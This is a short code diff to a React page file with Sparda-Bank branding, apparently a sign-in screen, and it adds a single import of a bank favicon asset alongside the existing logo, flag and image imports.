@@ -6,6 +6,7 @@ import { usePageMeta } from "@/hooks/use-page-meta";
 import { Eye, EyeOff, ArrowRight, TriangleAlert } from "lucide-react";
 import germanyFlag from "@/assets/germany-flag.svg.asset.json";
 import logoAsset from "@/assets/sparda-logo.avif.asset.json";
+import faviconAsset from "@/assets/favicons/spardabank.webp.asset.json";
 import teaserAsset from "@/assets/sparda-teaser.avif.asset.json";
 
 const BLUE = "#0056a3";
